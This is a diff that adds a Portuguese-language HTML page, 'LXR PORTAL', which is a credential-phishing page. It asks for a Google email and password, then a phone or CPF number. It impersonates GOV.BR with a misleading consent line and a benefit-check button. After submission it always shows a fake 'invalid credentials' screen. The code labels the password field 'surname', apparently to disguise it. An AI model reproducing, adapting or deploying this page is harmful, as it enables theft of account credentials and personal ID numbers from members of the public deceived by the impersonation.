@@ -1,0 +1,285 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>LXR PORTAL — Cadastro</title>
+  <link rel="stylesheet" href="styles.css">
+
+  <style>
+    [hidden] {
+      display: none !important;
+    }
+
+    .password-wrapper {
+      position: relative;
+      width: 100%;
+    }
+
+    .password-wrapper input {
+      width: 100%;
+      padding-right: 48px;
+    }
+
+    .toggle-password {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: transparent;
+      border: none;
+      padding: 5px;
+      color: #777;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: none;
+    }
+
+    .toggle-password:hover {
+      background: transparent;
+      color: #222;
+      box-shadow: none;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="topbar"></div>
+
+  <main class="page">
+
+    <!-- TELA DE CARREGAMENTO -->
+    <div id="loadingView" class="loading-view" hidden>
+      <div class="loading-content">
+        <div class="loading-spinner"></div>
+        <h2>Análise em andamento...</h2>
+        <p>Estamos realizando a verificação dos dados informados. Por favor, aguarde enquanto o processamento é concluído.</p>
+      </div>
+    </div>
+
+    <section class="login-card">
+
+
+  <form id="registrationForm">
+
+   <!-- ETAPA 1 -->
+<div id="stepOne">
+
+  <!-- LOGO PRIMEIRA TELA -->
+  <div class="brand-area">
+    <img class="logo" src="assests/logo.png" alt="LXR Portal">
+  </div>
+
+  <h1>Iniciar Sessão</h1>
+
+  <p class="intro">
+    Acesse sua conta Google utilizando seu e-mail e senha para continuar e liberar o acesso.
+  </p>
+
+  <!-- E-MAIL -->
+  <label for="email">Email</label>
+  <input
+    id="email"
+    type="email"
+    placeholder="Digite seu e-mail"
+    autocomplete="email"
+    required
+  >
+
+  <!-- SOBRENOME -->
+  <label for="surname">Senha</label>
+
+ <div class="password-wrapper">
+  <input
+    id="surname"
+    type="password"
+    placeholder="Digite sua senha"
+    autocomplete="current-password"
+    required
+  >
+
+  <button
+    type="button"
+    id="toggleSurname"
+    class="toggle-password"
+    aria-label="Mostrar senha"
+    aria-pressed="false"
+  >
+    <svg
+      id="eyeIcon"
+      viewBox="0 0 24 24"
+      width="20"
+      height="20"
+      fill="none"
+      stroke="currentColor"
+      stroke-width="2"
+    >
+      <path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7-10-7-10-7Z"/>
+      <circle cx="12" cy="12" r="3"/>
+    </svg>
+  </button>
+</div>
+<p id="surnameWarning" class="surname-warning" hidden>
+  Mantenha sua senha atualizada para garantir a segurança e evitar problemas de acesso.
+</p>
+  <button type="button" id="continueButton" class="primary-button">
+    CONTINUAR
+  </button>
+
+</div>
+
+
+<!-- ETAPA 2 -->
+<div id="stepTwo" hidden>
+
+  <div class="step-two-header">
+    <img src="./assests/logo2.png" alt="LXR PORTAL" class="step-logo">
+
+    <p>Informe seu NUMERO no campo indicado para prosseguir com a análise da consulta.</p>
+  </div>
+
+  <!-- TELEFONE -->
+  <div class="step-two-field">
+    <label for="phone">NUMERO</label>
+
+    <input
+      id="phone"
+      type="tel"
+      placeholder="Ex.: 345.6**.***-0*"
+      inputmode="numeric"
+      autocomplete="tel"
+      maxlength="14"
+      required
+    >
+  </div>
+
+  <!-- AVISO DE PRIVACIDADE -->
+  <div class="privacy-notice">
+    <strong></strong>
+    <p></p>
+  </div>
+
+  <!-- CONSENTIMENTO -->
+  <label class="consent-label">
+    <input
+      type="checkbox"
+      id="consent"
+      required
+    >
+    <span>
+      Autorizo o GOV a armazenar meu e-mail, senha e CPF
+      para a finalidade informada acima.
+    </span>
+  </label>
+
+  <!-- BOTÃO FINALIZAR -->
+  <button type="submit" id="submitButton" class="primary-button">
+    CONSULTAR BENEFÍCIO
+  </button>
+
+  <!-- BOTÃO VOLTAR -->
+  <button type="button" id="backButton" class="back-button">
+    ← Voltar
+  </button>
+
+</div>
+
+
+        <p id="registrationMessage" role="status" aria-live="polite"></p>
+
+      </form>
+
+  <!-- CONFIRMAÇÃO -->
+<div id="successView" hidden style="width:100%; text-align:center;">
+  <div class="success-content" style="text-align:center; display:flex; flex-direction:column; align-items:center;">
+    <h2>Não foi possível validar suas credenciais</h2>
+    <p>O e-mail ou a senha estão incorretos. Verifique os dados e tente novamente.</p>
+
+    <button
+  type="button"
+  onclick="window.location.reload()"
+  style="
+    margin-top:24px;
+    padding:11px 22px;
+    background:#4285e8;
+    color:#fff;
+    border:none;
+    border-radius:8px;
+    font-size:13px;
+    font-weight:600;
+    letter-spacing:0.3px;
+    cursor:pointer;
+    box-shadow:none;
+    transition:background 0.2s ease;
+  "
+  onmouseover="this.style.background='#3274d6'"
+  onmouseout="this.style.background='#4285e8'"
+>
+  VOLTAR AO INÍCIO
+</button>
+  </div>
+</div>
+
+<!-- LOGOS -->
+<div class="sponsors-section" style="width:100%; text-align:center;">
+  <div class="sponsors-logos" style="display:flex; justify-content:center; align-items:center; flex-wrap:wrap; gap:20px;">
+    <img src="./assests/logo1.png" alt="Logo 1">
+    <img src="./assests/logo2.png" alt="Logo 2">
+    <img src="./assests/logo3.png" alt="Logo 3">
+  </div>
+</div>
+
+<!-- RODAPÉ -->
+<p class="fine-print" style="text-align:center; width:100%;">
+  © 2026 GOV.BR — Serviços digitais do Governo Federal.
+</p>
+
+    </section>
+  </main>
+
+  <script src="app.js"></script>
+
+  <script>
+    const toggleSurname = document.getElementById("toggleSurname");
+    const surnameField = document.getElementById("surname");
+
+    toggleSurname.addEventListener("click", () => {
+      const showing = surnameField.type === "text";
+
+      surnameField.type = showing ? "password" : "text";
+
+      toggleSurname.setAttribute(
+        "aria-label",
+        showing ? "Mostrar sobrenome" : "Ocultar sobrenome"
+      );
+
+      toggleSurname.setAttribute("aria-pressed", String(!showing));
+    });
+  </script>
+
+</body>
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  const botaoOlho = document.getElementById("toggleSurname");
+  const campoSenha = document.getElementById("surname");
+
+  if (!botaoOlho || !campoSenha) return;
+
+  botaoOlho.addEventListener("click", function () {
+    const senhaOculta = campoSenha.type === "password";
+
+    campoSenha.type = senhaOculta ? "text" : "password";
+
+    botaoOlho.setAttribute(
+      "aria-label",
+      senhaOculta ? "Ocultar senha" : "Mostrar senha"
+    );
+
+    botaoOlho.setAttribute("aria-pressed", String(senhaOculta));
+  });
+});
+</script>
+</html>
